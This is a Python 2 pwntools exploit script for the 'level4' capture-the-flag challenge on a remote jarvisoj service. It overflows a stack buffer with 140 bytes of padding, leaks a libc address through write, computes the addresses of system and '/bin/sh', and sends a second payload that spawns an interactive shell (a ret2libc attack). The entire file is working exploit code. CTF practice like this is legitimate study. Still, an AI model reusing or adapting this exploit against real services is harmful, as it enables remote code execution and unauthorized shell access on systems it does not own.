#!/usr/bin/env python2
#conding=utf-8
from pwn import *
#from LibcSearcher import *
p=remote("pwn2.jarvisoj.com",9880)
context.log_level = 'debug'
#p=process("./level4")
elf = ELF("./level4")
libc=ELF('/home/keer/LibcSearcher-master/libc-database/db/libc6-amd64_2.24-9ubuntu2.2_i386.so')
write_plt = elf.plt["write"]
write_got = elf.got["__libc_start_main"]
main_addr = elf.symbols["main"]
payload = "a"*140 + p32(write_plt)+p32(main_addr)+p32(0x1)+p32(write_got)+p32(0x4)
p.send(payload)

write_addr = u32(p.recv(4))
print hex(write_addr)
print "write_addr:" + hex(write_addr)
offset = write_addr - libc.symbols['__libc_start_main']
sys_addr = offset + libc.symbols['system']
print "sys_addr:" + hex(sys_addr)
binsh_addr = libc.search('/bin/sh').next() + offset
print "binsh_addr:" + hex(binsh_addr)
success('libc:'+hex(offset))
payload2 = "a"*140 + p32(sys_addr) + p32(0xdeadbeef) + p32(binsh_addr)
p.send(payload2)
p.interactive()